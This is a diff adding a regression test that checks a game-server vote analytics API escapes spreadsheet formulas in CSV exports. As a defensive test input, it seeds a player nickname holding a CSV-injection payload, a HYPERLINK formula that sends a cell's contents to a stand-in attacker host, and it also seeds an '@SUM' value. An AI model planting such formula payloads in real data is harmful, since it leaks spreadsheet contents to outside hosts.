@@ -404,6 +404,30 @@ describeIfDb('GET /api/v1/analytics/votes', () => {
     expect(rows).toContain('trend,2026-06-01,9');
     expect(rows).toContain('serial_skipper,Skipper,5');
   });
+
+  it('neutralises spreadsheet formulas in player-controlled CSV cells (#366)', async () => {
+    const formulaNick = '=HYPERLINK("http://evil.test/?x="&A1,"click")';
+    const initiator = await seedPlayer(830020, formulaNick);
+    await seedVote({
+      serverId: SERVER_A,
+      startedAt: '2026-07-01T08:00:00.000Z',
+      initiatorPlayerId: initiator,
+      voteType: 'map_skip',
+      result: 'passed',
+      mapCurrent: '@SUM(1+1)',
+    });
+
+    const res = await fetchVotes(
+      '?from=2026-07-01T00:00:00.000Z&to=2026-07-02T00:00:00.000Z&format=csv',
+    );
+    expect(res.statusCode).toBe(200);
+    const rows = res.body.trim().split('\r\n');
+    expect(rows).toContain(
+      `top_initiator,"'=HYPERLINK(""http://evil.test/?x=""&A1,""click"")",1/1`,
+    );
+    expect(rows).toContain("pass_rate_by_map,'@SUM(1+1),1/1");
+    for (const row of rows) expect(row).not.toMatch(/(^|,)"?[=+@]/);
+  });
 });
 
 describeIfDb('GET /api/v1/players/:playerId/vote-stats', () => {
